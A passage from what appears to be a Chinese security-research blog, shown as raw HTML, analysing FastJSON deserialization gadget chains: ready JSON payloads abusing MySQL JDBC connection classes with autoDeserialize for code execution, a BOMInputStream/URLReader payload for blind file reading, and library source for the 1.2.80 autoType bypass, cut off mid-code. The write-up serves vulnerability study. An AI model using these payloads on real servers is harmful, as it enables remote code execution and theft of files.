class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span>,<br>        <span class="hljs-string">&quot;proxy&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;connectionString&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span><br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection构造方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">LoadBalancedMySQLConnection</span><span class="hljs-params">(LoadBalancedConnectionProxy proxy)</span> &#123;<br>    <span class="hljs-built_in">super</span>(proxy);<br>&#125;<br></code></pre></td></tr></table></figure><p>LoadBalancedConnectionProxy构造方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">LoadBalancedConnectionProxy</span><span class="hljs-params">(ConnectionString connectionString)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    ......<br>    <span class="hljs-built_in">this</span>.pickNewConnection();<br>&#125;<br></code></pre></td></tr></table></figure><p>然后用pickNewConnection()建立连接，最终造成反序列化</p><p>6.0.4中构造方法改变，此利用链无法使用</p><p>payload 8.0.19</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span>,<br>        <span class="hljs-string">&quot;proxy&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span>,<br>            <span class="hljs-string">&quot;connectionUrl&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span>,<br>                <span class="hljs-string">&quot;masters&quot;</span>:[&#123;<br>            <span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>        &#125;],<br>        <span class="hljs-string">&quot;slaves&quot;</span>:[],<br>        <span class="hljs-string">&quot;properties&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>                    <span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;yso_CommonsCollections4_calc&quot;</span>,<br>                    <span class="hljs-string">&quot;dbname&quot;</span>:<span class="hljs-string">&quot;dbname&quot;</span>,<br>                    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;pass&quot;</span>,<br>                    <span class="hljs-string">&quot;queryInterceptors&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<br>                    <span class="hljs-string">&quot;autoDeserialize&quot;</span>:<span class="hljs-string">&quot;true&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="Gadget2-文件写入读取"><a href="#Gadget2-文件写入读取" class="headerlink" title="Gadget2:文件写入读取"></a>Gadget2:文件写入读取</h6><p>payload如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;abc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;file:///D:/1.txt&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">66</span><span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.abc.BOM&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>x.x<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload分析：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.abc.BOM&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>此处使用FastJSON特性，”$ref””: “$.xx.yy”表示调用JSON对象中xx的yy属性。payload中即调用abc(org.apache.commons.io.input.BOMInputStream的BOM属性，即调用BOMInputStream的getBOM()方法。</p><p>org.apache.commons.io.input.BOMInputStream类分析</p><p>构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 传入InputStream 类型的 delegate 和 ByteOrderMark 数组 boms</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BOMInputStream</span><span class="hljs-params">(InputStream delegate, <span class="hljs-type">boolean</span> include, ByteOrderMark... boms)</span><br></code></pre></td></tr></table></figure><p>getBOM()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ByteOrderMark <span class="hljs-title function_">getBOM</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.firstBytes == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.fbLength = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">maxBomSize</span> <span class="hljs-operator">=</span> ((ByteOrderMark)<span class="hljs-built_in">this</span>.boms.get(<span class="hljs-number">0</span>)).length();<br>            <span class="hljs-built_in">this</span>.firstBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[maxBomSize];        <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.firstBytes.length; ++i) &#123;<br>            <span class="hljs-built_in">this</span>.firstBytes[i] = <span class="hljs-built_in">this</span>.in.read(); <span class="hljs-comment">// 从 delegate 输入流从取出所有字节，组成一个 int 数组</span><br>            ++<span class="hljs-built_in">this</span>.fbLength;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.firstBytes[i] &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.byteOrderMark = <span class="hljs-built_in">this</span>.find(); <span class="hljs-comment">// 开始把实例化对象时传入的 ByteOrderMark 数组 boms 和从 delegate 输入流从取出所有字节组成的int数组进行比对。</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.byteOrderMark != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-built_in">this</span>.include) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.byteOrderMark.length() &lt; <span class="hljs-built_in">this</span>.firstBytes.length) &#123;<br>                <span class="hljs-built_in">this</span>.fbIndex = <span class="hljs-built_in">this</span>.byteOrderMark.length();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">this</span>.fbLength = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.byteOrderMark; <span class="hljs-comment">//返回 byteOrderMark</span><br>&#125;<br><span class="hljs-keyword">private</span> ByteOrderMark <span class="hljs-title function_">find</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.boms.iterator();<br><br>    ByteOrderMark bom;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (!var1.hasNext()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        bom = (ByteOrderMark)var1.next();<br>    &#125; <span class="hljs-keyword">while</span>(!<span class="hljs-built_in">this</span>.matches(bom));<br><br>    <span class="hljs-keyword">return</span> bom;<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">matches</span><span class="hljs-params">(ByteOrderMark bom)</span> &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; bom.length(); ++i) &#123;<br>        <span class="hljs-keyword">if</span> (bom.get(i) != <span class="hljs-built_in">this</span>.firstBytes[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此处代码逻辑为将delegate 输入流的字节码转成 int 数组，然后用 ByteOrderMark 中的 bytes 挨个字节遍历进行比对，如果遍历过程有比对错误的 getBom 就会返回一个 null，如果遍历结束，没有比对错误那就会返回一个 ByteOrderMark 对象。所以此处文件读取成功的标志为 getBom 返回结果不为 null。故文件读取原理为字节码对比，通过遍历对比目标文件中字节码从而挨个字节获取文件内容，类似SQL盲注。</p><p>org.apache.commons.io.input.ReaderInputStream类分析：</p><p>构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ReaderInputStream</span><span class="hljs-params">(Reader reader, CharsetEncoder encoder, <span class="hljs-type">int</span> bufferSize)</span><br></code></pre></td></tr></table></figure><p>jdk.nashorn.api.scripting.URLReader类分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">URLReader</span><span class="hljs-params">(URL url)</span><br></code></pre></td></tr></table></figure><p>此处传入URL,则此处可使用file jar http 等协议</p><h3 id="91-2-72-Fastjson"><a href="#91-2-72-Fastjson" class="headerlink" title="91.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80"></a>91.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80</h3><h4 id="利用链分析：-9"><a href="#利用链分析：-9" class="headerlink" title="利用链分析："></a>利用链分析：</h4><p>FastJSON1.2.80与1.2.68相比，ParserConfig#checkAutoType()添加了期望类黑名单，期望类在黑名单中则无法加载，若期望类及目标类不在黑名单中则可使用与1.2.68类似绕过方法绕过检测。</p><p>ParserConfig#checkAutoType()方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeCheckHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//默认为空不进入</span><br>            <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeCheckHandlers.iterator();<br><br>            <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>                <span class="hljs-type">AutoTypeCheckHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (AutoTypeCheckHandler)var4.next();<br>                Class&lt;?&gt; type = h.handler(typeName, expectClass, features);<br>                <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">return</span> type;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">safeModeMask</span> <span class="hljs-operator">=</span> Feature.SafeMode.mask;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">safeMode</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.safeMode || (features &amp; safeModeMask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; safeModeMask) != <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (safeMode) &#123;<span class="hljs-comment">//若safeMode为true进入，不反序列化所有类</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;safeMode not support autoType : &quot;</span> + typeName);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &lt; <span class="hljs-number">192</span> &amp;&amp; typeName.length() &gt;= <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-type">boolean</span> expectClassFlag;<br>            <span class="hljs-keyword">if</span> (expectClass == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//期望类为空</span><br>                expectClassFlag = <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//期望类不为空</span><br>                <span class="hljs-type">long</span> <span class="hljs-variable">expectHash</span> <span class="hljs-operator">=</span> TypeUtils.fnv1a_64(expectClass.getName());<br>                <span class="hljs-keyword">if</span> (expectHash != -<span class="hljs-number">8024746738719829346L</span> &amp;&amp; expectHash != <span class="hljs-number">3247277300971823414L</span> &amp;&amp; expectHash != -<span class="hljs-number">5811778396720452501L</span> &amp;&amp; expectHash != -<span class="hljs-number">1368967840069965882L</span> &amp;&amp; expectHash != <span class="hljs-number">2980334044947851925L</span> &amp;&amp; expectHash != <span class="hljs-number">5183404141909004468L</span> &amp;&amp; expectHash != <span class="hljs-number">7222019943667248779L</span> &amp;&amp; expectHash != -<span class="hljs-number">2027296626235911549L</span> &amp;&amp; expectHash != -<span class="hljs-number">2114196234051346931L</span> &amp;&amp; expectHash != -<span class="hljs-number">2939497380989775398L</span>) &#123;<br>                    expectClassFlag = <span class="hljs-literal">true</span>;<span class="hljs-comment">//期望类不为空且不在黑名单中</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    expectClassFlag = <span class="hljs-literal">false</span>;<span class="hljs-comment">//期望类在黑名单中</span><br>                &#125;<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            <span class="hljs-type">long</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> (-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span>;<br>            <span class="hljs-keyword">if</span> (h1 == -<span class="hljs-number">5808493101479473382L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((h1 ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">h3</span> <span class="hljs-operator">=</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">2</span>)) * <span class="hljs-number">1099511628211L</span>;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">fullHash</span> <span class="hljs-operator">=</span> TypeUtils.fnv1a_64(className);<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">internalWhite</span> <span class="hljs-operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, fullHash) &gt;= <span class="hljs-number">0</span>;<br>                <span class="hljs-type">long</span> hash;<br>                <span class="hljs-type">int</span> mask;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.internalDenyHashCodes != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//黑名单校验</span><br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.internalDenyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                Class clazz;<br>                <span class="hljs-comment">////!internalWhite不为true  autoTypeSupport或expectClassFlag为true则进入</span><br>                <span class="hljs-keyword">if</span> (!internalWhite &amp;&amp; (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClassFlag)) &#123;<br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<span class="hljs-comment">//白名单校验，若在白名单中则返回类</span><br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span> &amp;&amp; Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, fullHash) &lt; <span class="hljs-number">0</span>) &#123;<br>                            <span 